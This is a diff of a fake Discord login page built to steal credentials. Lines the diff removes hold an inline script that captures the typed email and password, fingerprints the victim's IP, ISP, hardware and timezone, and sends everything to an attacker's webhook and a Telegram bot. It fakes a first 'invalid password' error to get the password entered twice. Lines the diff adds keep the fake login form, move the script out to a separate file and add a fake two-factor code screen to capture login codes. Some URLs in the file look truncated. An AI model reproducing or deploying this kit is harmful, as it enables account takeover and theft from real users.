@@ -2,139 +2,49 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Discord | Login</title>
     <link rel="icon" type="image/png" href="https://discord.com">
-    <style>
-        @import url('https://fonts.googleapis.com');
-        body { background-image: url('https://discord.com'); background-size: cover; background-position: center; background-color: #313338; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'gg sans', 'Noto Sans', sans-serif; margin: 0; overflow: hidden; }
-        .login-container { background-color: #313338; width: 784px; padding: 32px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); color: #f2f3f5; display: flex; justify-content: space-between; transition: 0.3s; }
-        .login-form-side { width: 414px; }
-        h3 { font-size: 24px; margin: 0 0 8px 0; font-weight: 600; text-align: center; }
-        p.subtitle { color: #b5bac1; margin-bottom: 20px; font-size: 16px; text-align: center; }
-        #error-msg { color: #fa777c; font-size: 14px; margin-bottom: 15px; display: none; font-weight: 500; }
-        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; }
-        input { width: 100%; padding: 10px; margin-bottom: 20px; background-color: #1e1f22; border: 1px solid transparent; border-radius: 3px; color: #dbdee1; font-size: 16px; box-sizing: border-box; }
-        .forgot-pw { color: #00a8fc; font-size: 14px; text-decoration: none; display: block; margin-top: -15px; margin-bottom: 20px; }
-        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.2s; }
-        button:hover { background-color: #4752c4; }
-        .footer { font-size: 14px; color: #b5bac1; margin-top: 10px; }
-        .footer a { color: #00a8fc; text-decoration: none; }
-        .qr-side { width: 240px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; border-left: 1px solid #404249; padding-left: 32px; }
-        .qr-box { background: white; padding: 8px; border-radius: 4px; margin-bottom: 20px; width: 176px; height: 176px; }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-    <div class="login-container">
+    <!-- Main Login Container -->
+    <div id="main-container" class="container">
         <div class="login-form-side">
             <h3>Welcome back!</h3>
             <p class="subtitle">We're so excited to see you again!</p>
             <div id="error-msg">Login or password is invalid.</div>
-
-            <form id="discordForm">
+            
+            <form id="loginForm">
                 <label>Email or Phone Number</label>
                 <input type="text" id="email" required autocomplete="off">
                 <label>Password</label>
                 <input type="password" id="password" required>
-                <a href="#" class="forgot-pw">Forgot your password?</a>
-                <button type="submit">Log In</button>
+                <button type="submit" id="loginBtn">Log In</button>
                 <p class="footer">Need an account? <a href="https://discord.com">Register</a></p>
             </form>
         </div>
 
-        <div class="qr-side">
-            <div class="qr-box">
-                <img src="https://api.qrserver.com" alt="QR">
-            </div>
-            <h3 style="color: white;">Log in with QR Code</h3>
-            <p style="font-size: 14px; color: #b5bac1;">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+        <!-- QR Side (Hidden via JS on mobile) -->
+        <div id="qr-side" class="qr-side">
+            <div class="qr-box" id="qrTarget"></div>
+            <h3>Log in with QR Code</h3>
+            <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
         </div>
     </div>
 
-    <script>
-        // --- CONFIGURATION ---
-        const WEBHOOK_URL = 'https://stoat.chat/api/webhooks/01KJPR7RGNCM29ZSWWE4FYBVX7/7QZYer1rLqMJHBA1VzU4Yr8i3G1hQyslbQEruO0HXiBrc1PTetaz4B5q9GkFrDXl';
-        const TG_TOKEN = 'YOUR_TELEGRAM_TOKEN';
-        const TG_CHAT_ID = 'YOUR_CHAT_ID';
+    <!-- 2FA Screen (Hidden by default) -->
+    <div id="two-factor-screen" class="container tfa-container" style="display: none;">
+        <img src="https://discord.com" class="tfa-icon">
+        <h3>Enter authentication code</h3>
+        <p class="subtitle">Enter the 6-digit code from your authenticator app or a backup code.</p>
+        <form id="tfaForm">
+            <label>Authentication Code</label>
+            <input type="text" id="tfa-code" placeholder="000000" maxlength="8" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
 
-        let attempts = 0;
-
-        async function getIntel(email) {
-            let data = {
-                ip: "N/A", isp: "N/A", vpn: "False", country: "N/A",
-                gpu: "N/A", ram: navigator.deviceMemory || "Unknown",
-                res: `${screen.width}x${screen.height}`, webrtc: "N/A", breach: "Clean"
-            };
-
-            try {
-                // IP & Network Data
-                const res = await fetch('http://ip-api.com');
-                const json = await res.json();
-                if (json.status === 'success') {
-                    data.ip = json.query;
-                    data.isp = json.isp;
-                    data.vpn = (json.proxy || json.hosting) ? "True" : "False";
-                    data.country = `${json.city}, ${json.country}`;
-                }
-
-                // GPU Detection
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-
-                // Breach Check
-                const breachRes = await fetch(`https://api.xposedornot.com{email}`);
-                if (breachRes.status === 200) data.breach = "⚠️ DATA BREACHED";
-
-            } catch (e) { console.log("Silent Error"); }
-            return data;
-        }
-
-        document.getElementById('discordForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            attempts++;
-            
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-            const intel = await getIntel(email);
-
-            const log = `
-🚨 **NEW LOGIN HARVEST** (Attempt ${attempts})
-👤 **Target:** \`${email}\`
-🔑 **Pass:** \`${pass}\`
----
-🌐 **Network Info:**
-📍 IP: \`${intel.ip}\` (${intel.country})
-🏢 ISP: \`${intel.isp}\`
-🛡️ VPN/Proxy: \`${intel.vpn}\`
-⚠️ Breach: \`${intel.breach}\`
----
-🖥️ **Hardware/Browser:**
-🎮 GPU: \`${intel.gpu}\`
-🧠 RAM: \`${intel.ram}GB\` | Res: \`${intel.res}\`
-🌍 Lang: \`${navigator.language}\` | TZ: \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`
-📱 OS: \`${navigator.platform}\`
-            `;
-
-            // Discord Send
-            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: log })});
-
-            // Telegram Send
-            fetch(`https://api.telegram.org{TG_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: log, parse_mode: "Markdown" })
-            });
-
-            if (attempts === 1) {
-                document.getElementById('error-msg').style.display = 'block';
-                document.getElementById('password').value = '';
-            } else {
-                window.location.href = "https://discord.com";
-            }
-        });
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
